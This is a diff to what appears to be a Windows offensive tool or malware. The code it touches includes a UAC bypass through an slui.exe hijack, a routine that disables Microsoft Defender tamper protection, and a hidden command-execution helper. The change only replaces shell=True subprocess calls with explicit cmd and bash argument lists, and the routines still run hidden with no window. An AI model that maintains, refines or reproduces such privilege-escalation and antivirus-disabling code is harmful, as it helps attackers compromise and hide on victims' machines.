@@ -5209,7 +5209,9 @@ def bypass_uac_slui_hijack():
                     if isinstance(method_args, list):
                         subprocess.Popen(method_args, creationflags=subprocess.CREATE_NO_WINDOW)
                     else:
-                        subprocess.Popen(method_args, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                        import shlex
+                        args = ['cmd', '/c', method_args] if os.name == 'nt' else shlex.split(method_args)
+                        subprocess.Popen(args, creationflags=subprocess.CREATE_NO_WINDOW)
                     
                     log_message(f"[ OK ] Successfully executed slui.exe using {method_name}")
                     success = True
@@ -6992,8 +6994,9 @@ def disable_defender_tamper_protection():
         
         for cmd in tamper_commands:
             try:
-                subprocess.run(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW, 
-                             timeout=15, capture_output=True, text=True)
+                import shlex
+                args = ['cmd.exe', '/C', cmd] if os.name == 'nt' else shlex.split(cmd)
+                subprocess.run(args, creationflags=subprocess.CREATE_NO_WINDOW, timeout=15, capture_output=True, text=True)
             except:
                 continue
         
@@ -8811,14 +8814,7 @@ def execute_in_powershell(command, timeout=30):
             )
         else:
             # For non-Windows, use bash but format similarly
-            result = subprocess.run(
-                command,
-                shell=True,
-                capture_output=True,
-                text=True,
-                timeout=timeout,
-                cwd=os.getcwd()
-            )
+            result = subprocess.run(['/bin/bash', '-lc', command], capture_output=True, text=True, timeout=timeout, cwd=os.getcwd())
             
             execution_time = int((time_module.time() - start_time) * 1000)
             
